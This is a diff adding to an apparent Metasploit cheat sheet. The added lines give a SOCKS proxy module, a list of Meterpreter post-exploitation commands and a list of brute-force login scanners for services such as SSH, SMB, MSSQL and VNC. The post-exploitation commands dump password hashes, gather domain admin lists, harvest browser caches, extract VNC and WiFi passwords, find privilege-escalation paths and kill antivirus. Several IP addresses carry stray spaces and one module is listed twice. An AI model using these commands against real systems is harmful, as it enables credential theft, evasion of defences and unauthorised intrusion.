@@ -155,3 +155,59 @@ set ExitOnSession false
 exploit -j -z
 
 Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
+
+
+
+# Socks agent
+Reference: https://www.freebuf.com/articles/network/125278.html
+use auxiliary/server/socks4a
+ set srvhost 127 .0.0.1
+ set srvport 2000
+run
+
+# Common script
+Run arp_scanner -r 192 .168.183.1/24   # Use arp for surviving host scan 
+run winenum   # automate some detection scripts 
+run credcollect # get user hash 
+run domain_list_gen   # get domain management account list 
+run post/multi/gather/env   # get User environment variable 
+run post/windows/gather/enum_logged_on_users -c   # List current login user 
+run post/linux/gather/checkvm   # virtual machine 
+run post/windows/gather/checkvm   # virtual machine 
+run post/windows/gather/ Forensics/enum_drives   # View memory information 
+run post/windows/gather/enum_applications   # Get installation software information 
+run post/windows/gather/dumplinks    # Get recently accessed documents, link information 
+run post/windows/gather/enum_ie  # Get IE cache 
+run post/windows/gather/enum_firefox   # Get firefox cache 
+run post/windows/gather/enum_chrome    # Get Chrome cache 
+run post/multi/recon/local_exploit_suggester   # Get local privilege vulnerability 
+run post/windows/gather/enum_patches   # Get patch information 
+run post/windows/gather/enum_domain   # Find domain control 
+run post/windows/gather/enum_snmp   # Get snmp community name 
+run post/windows/gather/credentials/vnc   # Get vnc password 
+run post/windows/wlan/ Wlan_profile   # Used to read the target host WiFi password 
+run post/multi/gather/wlan_geolocate # Based on wlan, the location confirmation file is located at /root/.msf4/loot
+run post/windows/manage/killav close antivirus software
+
+# Common crack module 
+Auxiliary/scanner/mssql/mssql_login
+Auxiliary/scanner/ftp/ftp_login
+Auxiliary/scanner/ssh/ssh_login
+Auxiliary/scanner/telnet/telnet_login
+Auxiliary/scanner/smb/smb_login
+Auxiliary/scanner/mssql/mssql_login
+Auxiliary/scanner/mysql/mysql_login
+Auxiliary/scanner/oracle/oracle_login
+Auxiliary/scanner/postgres/postgres_login
+Auxiliary/scanner/vnc/vnc_login
+Auxiliary/scanner/pcanywhere/pcanywhere_login
+Auxiliary/scanner/snmp/snmp_login
+Auxiliary/scanner/ftp/anonymous
+
+
+
+
+
+
+
+
